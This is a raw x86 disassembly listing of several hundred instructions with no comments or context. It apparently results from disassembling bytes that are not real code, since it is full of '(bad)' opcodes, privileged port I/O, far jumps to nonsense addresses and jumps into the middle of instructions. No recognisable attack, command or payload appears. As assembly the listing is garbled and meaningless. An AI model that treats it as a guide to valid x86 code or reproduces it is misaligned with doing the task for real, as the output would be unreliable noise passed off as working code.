  435a8c:	inc    ebx
  435a8d:	data16 fidiv WORD PTR [ecx+0x3e]
  435a91:	jmp    0x435aa5
  435a93:	(bad)  
  435a94:	push   esp
  435a95:	jo     0x435a85
  435a97:	fstp   QWORD PTR [edx-0x57]
  435a9a:	sub    ebx,ecx
  435a9c:	mov    edi,0x2aa07bd5
  435aa1:	stos   BYTE PTR es:[edi],al
  435aa2:	cmp    DWORD PTR ds:0x8908eb3e,esi
  435aa8:	jae    0x435a6e
  435aaa:	adc    ch,BYTE PTR [ebp+0x60]
  435aad:	sahf   
  435aae:	div    DWORD PTR [esi-0x706316a2]
  435ab4:	push   es
  435ab5:	scas   al,BYTE PTR es:[edi]
  435ab6:	mov    cl,0xf4
  435ab8:	inc    ecx
  435ab9:	pop    edx
  435aba:	jae    0x435b04
  435abc:	mov    bh,0x3b
  435abe:	or     esp,DWORD PTR [ecx+0x193ebc93]
  435ac4:	pop    esi
  435ac5:	test   eax,0x290d3d57
  435aca:	pop    ss
  435acb:	xlat   BYTE PTR ds:[ebx]
  435acc:	and    DWORD PTR [eax+0x28],0x47b5b010
  435ad3:	and    dl,BYTE PTR [ebp-0x6f5b1106]
  435ad9:	jl     0x435b00
  435adb:	and    BYTE PTR [ecx+0x78],dh
  435ade:	pop    edi
  435adf:	adc    DWORD PTR [esi],ebx
  435ae1:	pusha  
  435ae2:	aam    0xa3
  435ae4:	sub    edx,ebx
  435ae6:	cs ins DWORD PTR es:[edi],dx
  435ae8:	inc    edx
  435ae9:	cdq    
  435aea:	dec    esp
  435aeb:	add    al,BYTE PTR [esi-0x65d5149a]
  435af1:	dec    edi
  435af2:	xchg   ebx,eax
  435af3:	test   DWORD PTR [ecx],esi
  435af5:	leave  
  435af6:	imul   eax,DWORD PTR [eax+0x2f3060de],0xffffffeb
  435afd:	and    ah,BYTE PTR [edx+0x20]
  435b00:	push   0x541eee6
  435b05:	retf   
  435b06:	in     eax,0xf6
  435b08:	cmp    dh,BYTE PTR [ebx-0x7ee75eaf]
  435b0e:	fmul   QWORD PTR [eax-0x145e3777]
  435b14:	pop    esi
  435b15:	pop    esp
  435b16:	jmp    0x435ad5
  435b18:	ficom  DWORD PTR [eax*1+0x415e065c]
  435b1f:	popf   
  435b20:	sar    DWORD PTR [ecx+edi*2-0x27],cl
  435b24:	mov    fs,WORD PTR [ecx+eiz*2]
  435b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435b28:	pop    ebx
  435b29:	test   al,0x8
  435b2b:	sub    ecx,DWORD PTR [eax+0x5d]
  435b2e:	add    esp,DWORD PTR [ecx]
  435b30:	(bad)  
  435b31:	into   
  435b32:	mov    ebp,0x8d612331
  435b37:	mov    cl,BYTE PTR [eax]
  435b39:	adc    bh,BYTE PTR gs:[ecx+0xe]
  435b3d:	icebp  
  435b3e:	out    0x2a,eax
  435b40:	sbb    eax,0xbe0ef3f8
  435b45:	push   ebx
  435b46:	mov    ebp,0x8f6119b5
  435b4b:	jmp    0xa4a134e0
  435b50:	push   ecx
  435b51:	cmp    dh,ch
  435b53:	adc    BYTE PTR [edx+edx*2-0x76],cl
  435b57:	or     BYTE PTR fs:[edx],0x94
  435b5b:	out    dx,al
  435b5c:	fisub  DWORD PTR [eax-0x58]
  435b5f:	stos   DWORD PTR es:[edi],eax
  435b60:	repz sub ecx,ebp
  435b63:	add    al,BYTE PTR [edi]
  435b65:	adc    al,0xee
  435b67:	pushf  
  435b68:	cmp    BYTE PTR [ecx+0x462c6a82],al
  435b6e:	cwde   
  435b6f:	ja     0x435b91
  435b71:	popa   
  435b72:	mov    ch,0x1d
  435b74:	inc    ebx
  435b75:	mov    ds:0x88d31244,al
  435b7a:	out    dx,al
  435b7b:	test   bl,0xa3
  435b7e:	mov    dl,0xb0
  435b80:	xchg   BYTE PTR [ebp-0x1d],bh
  435b83:	psubb  mm1,QWORD PTR [eax]
  435b86:	and    eax,0x6fe06c0d
  435b8b:	fistp  QWORD PTR [esi]
  435b8d:	ja     0x435b41
  435b8f:	dec    eax
  435b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435b91:	pusha  
  435b92:	imul   BYTE PTR [esi]
  435b94:	mov    ecx,0xb2a7dc53
  435b99:	or     bh,ah
  435b9b:	add    al,0x8a
  435b9d:	jns    0x435b85
  435b9f:	je     0x435bbf
  435ba1:	jge    0x435bd5
  435ba3:	daa    
  435ba4:	stos   DWORD PTR es:[edi],eax
  435ba5:	pop    ebp
  435ba6:	test   al,0x65
  435ba8:	std    
  435ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435bab:	mov    BYTE PTR [esi+0x5e405c6b],bl
  435bb1:	jb     0x435c31
  435bb3:	inc    ecx
  435bb4:	adc    esp,ebp
  435bb6:	jmp    0x435b71
  435bb8:	and    DWORD PTR [eax+0x41],0x5fd87e6b
  435bbf:	je     0x435b7c
  435bc1:	sti    
  435bc2:	pusha  
  435bc3:	dec    esp
  435bc4:	inc    esp
  435bc5:	mov    edi,0x305e1e44
  435bca:	sbb    ebp,esp
  435bcc:	hlt    
  435bcd:	cmp    edx,edi
  435bcf:	jmp    0x435c3f
  435bd1:	pusha  
  435bd2:	or     BYTE PTR [edi-0x51],bh
  435bd5:	retf   
  435bd6:	ret    0x7716
  435bd9:	ss lock mov ecx,0x2377502
  435be0:	shl    DWORD PTR [edx-0x16],0x94
  435be4:	cs retf 0xa90f
  435be8:	mov    ss,edi
  435bea:	out    dx,al
  435beb:	gs in  eax,dx
  435bed:	test   edi,ecx
  435bef:	dec    edx
  435bf0:	mov    ds:0xc7d3eee3,eax
  435bf5:	outs   dx,BYTE PTR ds:[esi]
  435bf6:	mov    ch,0x63
  435bf8:	loope  0x435c74
  435bfa:	lods   eax,DWORD PTR ds:[esi]
  435bfb:	out    dx,eax
  435bfc:	enter  0xa960,0xf2
  435c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435c01:	jmp    0x435bfd
  435c03:	popf   
  435c04:	cmp    eax,0xc98702fd
  435c09:	(bad)  
  435c0a:	cs mov bl,0xbc
  435c0d:	jne    0x435bc2
  435c0f:	cmp    edx,DWORD PTR [ebx+0x61]
  435c12:	jecxz  0x435c7d
  435c14:	loopne 0x435bca
  435c16:	neg    DWORD PTR [ecx]
  435c18:	sbb    dl,BYTE PTR [ebp-0x39307e12]
  435c1e:	push   cs
  435c1f:	in     eax,dx
  435c20:	cmp    eax,0xe3a0f946
  435c25:	cmp    al,0xe4
  435c27:	adc    BYTE PTR [eax+0x63d26455],ch
  435c2d:	mov    eax,ds:0x808944fa
  435c32:	inc    edi
  435c33:	lea    ecx,[edx]
  435c35:	jmp    0x435c63
  435c37:	mov    eax,ds:0x5c1506b9
  435c3c:	js     0x435cb7
  435c3e:	and    ecx,esi
  435c40:	addr16 cmp bl,cl
  435c43:	mov    dh,0xc7
  435c45:	loopne 0x435c9e
  435c47:	inc    esp
  435c48:	fsubr  DWORD PTR ds:0x8ba0becd
  435c4e:	test   eax,0x3a59f8a1
  435c53:	stos   BYTE PTR es:[edi],al
  435c54:	test   ax,0xbf56
  435c58:	pop    esi
  435c59:	bt     DWORD PTR [edx+0x4f],ebx
  435c5d:	popf   
  435c5e:	in     al,dx
  435c5f:	jl     0x435c15
  435c61:	inc    esp
  435c62:	shl    BYTE PTR [edx-0x2f],1
  435c65:	inc    ebx
  435c66:	hlt    
  435c67:	jmp    0x7001:0xb76b885e
  435c6e:	mov    dh,0x16
  435c70:	pop    esi
  435c71:	adc    al,dh
  435c73:	push   ds
  435c74:	aaa    
  435c75:	lock outs dx,BYTE PTR ds:[esi]
  435c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435c78:	mov    bl,BYTE PTR [ebp+0x29]
  435c7b:	cmp    eax,0xc81bf8e0
  435c80:	imul   edx,DWORD PTR [eax-0x5c4bdb68],0xffffffee
  435c87:	out    dx,eax
  435c88:	pushf  
  435c89:	xchg   edi,eax
  435c8a:	shl    eax,0xcc
  435c8d:	and    ebp,DWORD PTR [ebx+0x39064a0]
  435c93:	not    BYTE PTR [eax+0x20]
  435c96:	shr    DWORD PTR [edx],cl
  435c98:	lock jmp 0x46ee:0x2d55798e
  435ca0:	xor    al,0x70
  435ca2:	adc    BYTE PTR [edx],0x12
  435ca5:	or     eax,0x6bfb9ff5
  435caa:	outs   dx,DWORD PTR ds:[esi]
  435cab:	or     ebx,DWORD PTR [esi]
  435cad:	mov    ds:0xa87dc897,al
  435cb2:	out    dx,al
  435cb3:	add    al,0x16
  435cb5:	lds    ecx,FWORD PTR [edx]
  435cb7:	ror    DWORD PTR [esi-0x7f5ed5c3],0x9
  435cbe:	adc    bh,bl
  435cc0:	pop    ecx
  435cc1:	shl    esi,cl
  435cc3:	test   BYTE PTR [esi-0x55],bl
  435cc6:	xchg   esp,eax
  435cc7:	das    
  435cc8:	fnstcw WORD PTR [edx+0x27f5bca3]
  435cce:	mov    edi,0x9597dfa0
  435cd3:	mov    ds:0xd1e69bc7,al
  435cd8:	div    DWORD PTR [ecx+0x568d94eb]
  435cde:	sar    DWORD PTR [esi],0x6a
  435ce1:	add    BYTE PTR [ebp+0x465e18ba],ch
  435ce7:	inc    edx
  435ce8:	pop    ss
  435ce9:	loop   0x435d2e
  435ceb:	outs   dx,DWORD PTR ds:[esi]
  435cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435ced:	retf   
  435cee:	jne    0x435d0c
  435cf0:	arpl   WORD PTR [edx-0x7f7115a3],ax
  435cf6:	in     al,dx
  435cf7:	or     DWORD PTR [eax-0x51],ecx
  435cfa:	(bad)  
  435cfb:	mov    al,ds:0x77b2fbb6
  435d00:	in     eax,0xd4
  435d02:	scas   al,BYTE PTR es:[edi]
  435d03:	inc    esp
  435d04:	pop    esi
  435d05:	mov    eax,ds:0x5f0f75b7
  435d0a:	adc    eax,0xb86159f0
  435d0f:	mov    ebp,0x732b4180
  435d14:	ins    DWORD PTR es:[edi],dx
  435d15:	imul   ebp,esi,0xb3101ab3
  435d1b:	imul   edi,DWORD PTR [esi+0x71a11de1],0x3e
  435d22:	mov    ds:0x1c57ae77,al
  435d27:	sti    
  435d28:	xchg   al,ah
  435d2a:	push   edx
  435d2b:	sahf   
  435d2c:	pop    esi
  435d2d:	fisubr WORD PTR [ecx]
  435d2f:	push   es
  435d30:	cld    
  435d31:	aas    
  435d32:	inc    ebp
  435d33:	push   ss
  435d34:	jmp    DWORD PTR [eax+0x5b]
  435d37:	xor    BYTE PTR [esi-0x1d],dh
  435d3a:	xchg   ebx,eax
  435d3b:	jmp    0x435d0a
  435d3d:	pop    eax
  435d3e:	in     eax,dx
  435d3f:	push   esi
  435d40:	stos   BYTE PTR es:[edi],al
  435d41:	cdq    
  435d42:	les    edi,FWORD PTR [eax+0x5e62a85f]
  435d48:	dec    esi
  435d49:	imul   esi,DWORD PTR [ecx-0x79],0x218bc053
  435d50:	xor    eax,0xc3dc4ecd
  435d55:	jns    0x435d45
  435d57:	mov    ch,0x9e
  435d59:	xor    BYTE PTR [ebx+0x7821d8bf],bh
  435d5f:	mov    eax,ds:0xfd1ee969
  435d64:	into   
  435d65:	or     ecx,DWORD PTR [edi+0x29]
  435d68:	pop    esi
  435d69:	test   al,0x89
  435d6b:	sub    BYTE PTR [ecx+0x3],bl
  435d6e:	pop    edi
  435d6f:	xchg   esp,eax
  435d70:	popf   
  435d71:	stos   BYTE PTR es:[edi],al
  435d72:	push   cs
  435d73:	mov    eax,ds:0xd5662984
  435d78:	xlat   BYTE PTR ds:[ebx]
  435d79:	jbe    0x435dbf
  435d7b:	retf   0x655e
  435d7e:	jbe    0x435d22
  435d80:	fdiv   DWORD PTR [eax]
  435d82:	add    al,0x5
  435d84:	mov    ebx,0x96884260
  435d89:	sub    ebx,DWORD PTR [esi-0x4a]
  435d8c:	jne    0x435de7
  435d8e:	out    dx,al
  435d8f:	xchg   esp,eax
  435d90:	into   
  435d91:	push   edi
  435d92:	ret    
  435d93:	in     al,dx
  435d94:	pusha  
  435d95:	clc    
  435d96:	mov    DWORD PTR [ecx-0x4c4917be],esp
  435d9c:	jnp    0x435dd3
  435d9e:	pop    eax
  435d9f:	mov    ds:0x7affca5e,al
  435da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435da5:	repnz xor bl,BYTE PTR [ecx+ebx*8+0x60]
  435daa:	push   ebx
  435dab:	push   ebx
  435dac:	jo     0x435dfd
  435dae:	push   ebp
  435daf:	ror    DWORD PTR [esp+edi*1-0x22],cl
  435db3:	pop    eax
  435db4:	xor    DWORD PTR [ecx-0x6a],edi
  435db7:	scas   eax,DWORD PTR es:[edi]
  435db8:	mov    cl,0xd2
  435dba:	mov    dl,0x14
  435dbc:	push   ebx
  435dbd:	shr    DWORD PTR [ebx-0x31],0x1a
  435dc1:	retf   
  435dc2:	add    BYTE PTR [ecx+0x740a407f],ah
  435dc8:	jp     0x435e08
  435dca:	bound  edi,QWORD PTR [edi]
  435dcc:	xor    eax,0xf48ec4b9
  435dd1:	pop    eax
  435dd2:	scas   al,BYTE PTR es:[edi]
  435dd3:	imul   ebp,DWORD PTR [esi+0x1a90b64],0x96d5d55a
  435ddd:	das    
  435dde:	cli    
  435ddf:	xlat   BYTE PTR ds:[ebx]
  435de0:	psllw  mm4,QWORD PTR [eax]
  435de3:	popf   
  435de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435de5:	push   esi
  435de6:	and    BYTE PTR [edi+0xe0dd9b5],dh
  435dec:	add    dl,BYTE PTR ds:0xf14a6ffb
  435df2:	jl     0x435dd8
  435df4:	ret    0x77ac
  435df7:	mov    eax,ds:0x2df035ef
  435dfc:	gs sti 
  435dfe:	imul   eax,DWORD PTR [esi+0x51],0x736ed5d3
  435e05:	pusha  
  435e06:	xor    DWORD PTR [eax+0x5b71ea88],eax
  435e0c:	mov    WORD PTR [eax],?
  435e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e0f:	mov    eax,ds:0x90c701b1
  435e14:	jle    0x435e0d
  435e16:	imul   esp,ecx,0xff2ce65e
  435e1c:	mov    ds:0xedad9c55,al
  435e21:	adc    eax,0x5e8070e2
  435e26:	out    dx,al
  435e27:	cmp    eax,0x15142d4e
  435e2c:	cmp    bh,dh
  435e2e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  435e30:	scas   al,BYTE PTR es:[edi]
  435e31:	mov    ebx,0x6d951f77
  435e36:	pop    ebx
  435e37:	or     al,0xb6
  435e39:	dec    sp
  435e3b:	sahf   
  435e3c:	pop    esi
  435e3d:	jle    0x435ea3
  435e3f:	out    0x25,al
  435e41:	jne    0x435e13
  435e43:	add    eax,0x34a360cc
  435e48:	push   cs
  435e49:	adc    eax,0xb23479dd
  435e4e:	out    dx,al
  435e4f:	xchg   ebp,eax
  435e50:	jle    0x435e14
  435e52:	cmp    DWORD PTR [edi+eiz*8-0x5],esi
  435e56:	std    
  435e57:	cdq    
  435e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e59:	sub    al,0x22
  435e5b:	sub    DWORD PTR [esi+0x32],ebx
  435e5e:	retf   0x1838
  435e61:	sub    al,0xe7
  435e63:	mov    WORD PTR [ebp-0x38d26c7f],ss
  435e69:	loopne 0x435e6e
  435e6b:	aam    0xc9
  435e6d:	dec    esp
  435e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e6f:	mov    eax,ds:0x61cfceb3
  435e74:	jnp    0x435e79
  435e76:	mov    eax,0x9a2a5162
  435e7b:	xor    ebp,esi
  435e7d:	mov    dh,0x9e
  435e7f:	mov    bl,cl
  435e81:	pusha  
  435e82:	push   ss
  435e83:	fistp  DWORD PTR [ebx+edi*2]
  435e86:	in     eax,dx
  435e87:	dec    ecx
  435e88:	shl    al,cl
  435e8a:	out    dx,al
  435e8b:	xchg   ebx,eax
  435e8c:	data16 sbb BYTE PTR [esi-0x6e622736],ch
  435e93:	mov    eax,ds:0xbbd1b54a
  435e98:	cwde   
  435e99:	lahf   
  435e9a:	push   ecx
  435e9b:	adc    dh,BYTE PTR [edx]
  435e9d:	jno    0x435ec0
  435e9f:	and    edi,ebx
  435ea1:	add    DWORD PTR [edi-0x4c],0xffffffbc
  435ea5:	fbstp  TBYTE PTR [esi+0x10606a86]
  435eab:	mov    edx,0x6377f26e
  435eb0:	pop    eax
  435eb1:	jg     0x435ea1
  435eb3:	inc    edi
  435eb4:	xchg   esp,edi
  435eb6:	neg    BYTE PTR [edx-0x5b]
  435eb9:	fwait
  435eba:	jo     0x435e5b
  435ebc:	sti    
  435ebd:	cmp    BYTE PTR [esi+eax*2+0xaaedfa3],0x94
  435ec5:	mov    cl,0x2c
  435ec7:	xchg   edx,eax
  435ec8:	xor    ch,ah
  435eca:	xchg   BYTE PTR [ecx-0x40381f31],ch
  435ed0:	push   edx
  435ed1:	push   0x11
  435ed3:	fnsave [esi+0x8]
  435ed6:	ja     0x435f4c
  435ed8:	pop    esi
  435ed9:	sub    al,0x5f
  435edb:	lods   eax,DWORD PTR ds:[esi]
  435edc:	dec    edx
  435edd:	mov    ebp,0xb3ed3708
  435ee2:	out    dx,al
  435ee3:	pop    ebx
  435ee4:	into   
  435ee5:	neg    esp
  435ee7:	adc    al,0xb2
  435ee9:	fidiv  DWORD PTR [edi+0x77]
  435eec:	loopne 0x435f45
  435eee:	mov    dh,BYTE PTR [ebp+0x584b9b]
  435ef4:	pop    esi
  435ef5:	arpl   WORD PTR [ebp-0x5ac9d7ca],bx
  435efb:	lods   al,BYTE PTR ds:[esi]
  435efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435efd:	js     0x435f6d
  435eff:	jo     0x435f62
  435f01:	stc    
  435f02:	mov    al,ds:0x63ff241
  435f07:	mov    dl,0xd0
  435f09:	inc    esp
  435f0a:	inc    eax
  435f0b:	jnp    0x435ebb
  435f0d:	pusha  
  435f0e:	xor    DWORD PTR [edi+0x32e40368],0x5b
  435f15:	aam    0xf8
  435f17:	mov    DWORD PTR [edi],eax
  435f19:	lock xchg esp,eax
  435f1b:	mov    ds:0x47f62428,al
  435f20:	in     eax,dx
  435f21:	mov    eax,0xb35d9ba0
  435f26:	or     BYTE PTR [ebp+0x21],dh
  435f29:	fld    st(2)
  435f2b:	addr16 xchg esi,eax
  435f2d:	push   ds
  435f2e:	mov    eax,fs:0x2e4bdacb
  435f34:	out    dx,al
  435f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435f36:	or     esp,DWORD PTR [ebp+0x6f]
  435f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435f3a:	jmp    0xe56bcdb7
  435f3f:	dec    edx
  435f40:	pop    esi
  435f41:	fwait
  435f42:	inc    ebx
  435f43:	push   es
  435f44:	ret    
  435f45:	outs   dx,BYTE PTR ds:[esi]
  435f46:	jmp    0x9292:0x365f4e8e
  435f4d:	and    esp,ebp
  435f4f:	sbb    ebx,DWORD PTR [esi+0x5e41f87a]
  435f55:	sbb    ebx,DWORD PTR [esi-0x2c]
  435f58:	outs   dx,DWORD PTR ds:[esi]
  435f59:	pop    esp
  435f5a:	mov    eax,0xbe518dc3
  435f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435f60:	mov    BYTE PTR [ebx-0x32],dh
  435f63:	fwait
  435f64:	mov    ecx,0x5e8b67b8
  435f69:	sub    edi,DWORD PTR [esi]
  435f6b:	or     edi,esi
  435f6d:	xor    BYTE PTR [ecx],cl
  435f6f:	(bad)  
  435f70:	mov    ah,0x60
  435f72:	scas   eax,DWORD PTR es:[edi]
  435f73:	jne    0x435f15
  435f75:	xor    edi,esp
  435f77:	mov    ebx,0x5eee979b
  435f7c:	sub    eax,DWORD PTR [ecx+0xb]
  435f7f:	fist   DWORD PTR [edx]
  435f81:	dec    esp
  435f82:	add    eax,0xb9a4e0a1
  435f87:	setb   BYTE PTR [edx-0x2e]
  435f8b:	sbb    bl,BYTE PTR [ebx-0x26]
  435f8e:	pop    es
  435f8f:	out    dx,eax
  435f90:	cmp    eax,0xc3215f75
  435f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435f96:	repz or al,0x61
  435f99:	popa   
  435f9a:	cli    
  435f9b:	xor    DWORD PTR [eax],0x1e
  435f9e:	cmp    eax,0x9e05693e
  435fa3:	and    ebx,DWORD PTR [esi+0x50]
  435fa6:	fsub   QWORD PTR [edx-0x37]
  435fa9:	pop    esp
  435faa:	out    0x14,eax
  435fac:	repnz and eax,0x82b4a043
  435fb2:	fs retf 
  435fb4:	pop    esi
  435fb5:	cli    
  435fb6:	push   cs
  435fb7:	mov    edi,0x6101b957
  435fbc:	(bad)  
  435fbd:	loope  0x435fa6
  435fbf:	sub    BYTE PTR [edi+0x62883e07],ch
  435fc5:	mov    esp,0x60bff0b5
  435fca:	mov    dh,0x96
  435fcc:	xor    al,0x22
  435fce:	mov    eax,0xeecfcf17
  435fd3:	retf   
  435fd4:	scas   eax,DWORD PTR es:[edi]
  435fd5:	(bad)  
  435fd6:	push   ebp
  435fd7:	jae    0x435fc2
  435fd9:	mov    eax,DWORD PTR [eax-0x5f]
  435fdc:	xor    DWORD PTR [edx-0x465636af],esi
  435fe2:	xchg   esi,eax
  435fe3:	(bad)  
  435fe4:	pop    esi
  435fe5:	and    DWORD PTR [edi-0x6f],esp
  435fe8:	mov    ah,0x79
  435fea:	xor    DWORD PTR [ebp+edi*4+0x3a9b3e60],ebp
  435ff1:	jmp    0x86f0:0xde4ca501
  435ff8:	mov    ecx,0xebc12410
  435ffd:	rcl    DWORD PTR [ebp-0x459f30b4],0x69
  436004:	aad    0xc2
  436006:	in     eax,0x7
  436008:	push   eax
  436009:	pusha  
  43600a:	out    dx,al
  43600b:	jp     0x436061
  43600d:	pop    ss
  43600e:	mov    eax,ds:0xf75071a7
  436013:	fwait
  436014:	jo     0x43608c
  436016:	ins    BYTE PTR es:[edi],dx
  436017:	lods   eax,DWORD PTR ds:[esi]
  436018:	fild   WORD PTR [edx-0x7090e32c]
  43601e:	push   esi
  43601f:	mov    cl,0xc2
  436021:	jmp    0x793f:0xc936eeed
  436028:	shl    ecx,0x1e
  43602b:	jmp    0x435fdb
  43602d:	ror    BYTE PTR fs:[esi+0x4a],cl
  436031:	sbb    DWORD PTR [ebp+0x58],ebp
  436034:	pop    esi
  436035:	xchg   BYTE PTR [ebx+0x6d],ch
  436038:	xlat   BYTE PTR ds:[ebx]
  436039:	sbb    DWORD PTR [esi],0x14
  43603c:	pop    esi
  43603d:	and    esi,ecx
  43603f:	mov    bh,0x50
  436041:	scas   al,BYTE PTR es:[edi]
  436042:	xor    dh,BYTE PTR [eax-0x5ee7d4c4]
  436048:	jo     0x436035
  43604a:	jne    0x436099
  43604c:	push   ebx
  43604d:	dec    eax
  43604e:	das    
  43604f:	addr16 pop esi
  436051:	fs stc 
  436053:	fild   DWORD PTR [esi+0x5f]
  436056:	lods   al,BYTE PTR ds:[esi]
  436057:	popa   
  436058:	or     BYTE PTR [ecx-0x5d],ah
  43605b:	pop    esp
  43605c:	sub    ebx,DWORD PTR [ebx-0x46]
  43605f:	idiv   DWORD PTR [ecx-0x346111e8]
  436065:	and    DWORD PTR [eax-0x4e3add45],ebp
  43606b:	mov    al,ds:0x62f77ff1
  436070:	cdq    
  436071:	sub    DWORD PTR [edx],0x1b
  436074:	pop    esi
  436075:	xchg   ebx,eax
  436076:	cmp    BYTE PTR [esi-0x76],al
  436079:	adc    bl,bh
  43607b:	push   edx
  43607c:	xchg   edx,eax
  43607d:	bound  ebx,QWORD PTR [ebp+0x44]
  436080:	pop    esi
  436081:	and    ecx,DWORD PTR [edx-0x6f]
  436084:	jg     0x43608a
  436086:	mov    ah,0x16
  436088:	pop    esi
  436089:	mov    ecx,0xa3f3a1ae
  43608e:	add    BYTE PTR [ecx],dl
  436090:	rol    DWORD PTR [ecx-0x6e],1
  436093:	inc    edx
  436094:	add    esp,DWORD PTR [eax+0x2b]
  436097:	adc    al,0x88
  436099:	dec    ebx
  43609a:	inc    edx
  43609b:	test   BYTE PTR [esi-0x150361e3],dl
  4360a1:	mov    edx,0x561b8002
  4360a6:	sub    DWORD PTR ds:0xa150ac55,ecx
  4360ac:	dec    ecx
  4360ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4360ae:	std    
  4360af:	sbb    eax,0x678e92ed
  4360b4:	bnd jo 0x4360a5
  4360b7:	push   ebx
  4360b8:	jl     0x43612d
  4360ba:	je     0x43608a
  4360bc:	jg     0x436120
  4360be:	mov    cl,0xa3
  4360c0:	mov    BYTE PTR [esi+0x5166c3eb],bh
  4360c6:	push   esi
  4360c7:	fmul   DWORD PTR [edi]
  4360c9:	xor    ebp,ebx
  4360cb:	sbb    BYTE PTR [edx+ecx*2-0x3f],ah
  4360cf:	sbb    DWORD PTR [edx],ecx
  4360d1:	mov    ch,BYTE PTR [esi+0x3e]
  4360d4:	sbb    BYTE PTR [ebp-0xd],ah
  4360d7:	mov    al,ds:0x7f01091f
  4360dc:	push   cs
  4360dd:	ins    BYTE PTR es:[edi],dx
  4360de:	or     ebx,edi
  4360e0:	push   edx
  4360e1:	cli    
  4360e2:	mov    bl,0x88
  4360e4:	pop    ebx
  4360e5:	pop    ebp
  4360e6:	pop    ecx
  4360e7:	mov    ds:0x3675160,ax
  4360ed:	cmc    
  4360ee:	rcl    BYTE PTR [edi-0x5ec8afe5],0xb2
  4360f5:	in     al,0x3f
  4360f7:	push   ebx
  4360f8:	mov    edx,0x91b7eedc
  4360fd:	and    BYTE PTR [eax+0x0],al
  436100:	(bad)  
  436101:	cmp    ah,BYTE PTR [esi-0x5f]
  436104:	popa   
  436105:	jp     0x4360e8
  436107:	iret   
  436108:	scas   al,BYTE PTR es:[edi]
  436109:	jmp    0x69a1a86f
  43610e:	dec    edi
  43610f:	aam    0xba
  436111:	or     edx,DWORD PTR [eax]
  436113:	sbb    BYTE PTR [ebp+0x5d],dh
  436116:	sub    eax,0x6e4c7644
  43611b:	sub    edx,esi
  43611d:	retf   0xa09
  436120:	pop    esi
  436121:	iret   
  436122:	movzx  ebx,ax
  436125:	(bad)  
  436126:	mov    al,0xaf
  436128:	repnz pusha 
  43612a:	and    dl,BYTE PTR [esi+0x3]
  43612d:	pusha  
  43612e:	jge    0x4360f3
  436130:	and    DWORD PTR [esi+ebp*8+0x41],ecx
  436134:	into   
  436135:	ja     0x436198
  436137:	cmp    eax,0xbdf81bfd
  43613c:	xchg   BYTE PTR [ebp-0x42],ah
  43613f:	mov    ?,WORD PTR [edx-0x45]
  436142:	out    dx,al
  436143:	arpl   WORD PTR [edi-0x616c7d8e],cx
  436149:	cmp    eax,DWORD PTR [esi-0x5f]
  43614c:	aad    0xbc
  43614e:	pop    ebx
  43614f:	fstp   QWORD PTR [ecx+0x57]
  436152:	xchg   esp,eax
  436153:	cld    
  436154:	push   ecx
  436155:	test   BYTE PTR [esi],dh
  436157:	mov    ebx,DWORD PTR [esi]
  436159:	dec    edx
  43615a:	sub    DWORD PTR [esi-0x5ec77a78],edi
  436160:	mov    bl,BYTE PTR [ebx+edi*4-0x658050f8]
  436167:	xor    BYTE PTR [ebp+0x4c],bl
  43616a:	addr16 or edi,esi
  43616d:	stc    
  43616e:	jb     0x436134
  436170:	mov    esi,DWORD PTR [eax+0x6097b350]
  436176:	cmp    eax,0xad152ef3
  43617b:	stos   DWORD PTR es:[edi],eax
  43617c:	bound  esp,QWORD PTR [esi]
  43617e:	out    dx,al
  43617f:	push   0xf89fdc19
  436184:	(bad)  [ecx+0xa]
  436187:	call   0x15db:0xe0cb068c
  43618e:	xchg   edi,eax
  43618f:	rol    DWORD PTR [ebx+esi*1-0x29856cec],1
  436196:	out    dx,al
  436197:	xchg   esi,eax
  436198:	and    BYTE PTR [esi],ch
  43619a:	mov    cl,0x2f
  43619c:	cmp    BYTE PTR [edi+0x7103900d],al
  4361a2:	lds    esp,FWORD PTR [eax-0x4b]
  4361a5:	cwde   
  4361a6:	ret    
  4361a7:	push   0xa6ee5f3f
  4361ac:	jle    0x4361dc
  4361ae:	fwait
  4361af:	cmc    
  4361b0:	call   0x75e4bd0c
  4361b5:	clc    
  4361b6:	and    ebx,ebp
  4361b8:	out    dx,eax
  4361b9:	test   al,0x2b
  4361bb:	push   ecx
  4361bc:	test   BYTE PTR [eax+esi*8],cl
  4361bf:	dec    eax
  4361c0:	jge    0x43622b
  4361c2:	mov    esp,0xee5ec4d6
  4361c7:	fdiv   st,st(5)
  4361c9:	inc    edx
  4361ca:	dec    esi
  4361cb:	cs ds (bad) 
  4361ce:	out    0xa9,eax
  4361d0:	or     al,BYTE PTR [eax]
  4361d2:	mov    ecx,0xb93d4e54
  4361d7:	jl     0x43623b
  4361d9:	pusha  
  4361da:	and    al,0xfb
  4361dc:	sbb    al,0x30
  4361de:	cmc    
  4361df:	mov    ds,WORD PTR ss:[ecx+ecx*4+0x49a5edb]
  4361e7:	sub    DWORD PTR [esi+ebx*2-0x53],ecx
  4361eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4361ec:	popf   
  4361ed:	pusha  
  4361ee:	mov    al,0x8c
  4361f0:	mov    esi,0x85dca8ba
  4361f5:	xchg   esp,eax
  4361f6:	in     eax,dx
  4361f7:	addr16 dec ebp
  4361f9:	add    dh,BYTE PTR [ebx+0x36]
  4361fc:	mov    ebx,0x63713aad
  436201:	popa   
  436202:	mov    ds:0xfc44bf7,eax
  436207:	jl     0x43623b
  436209:	or     esi,ebp
  43620b:	fst    QWORD PTR [edx+0x1d]
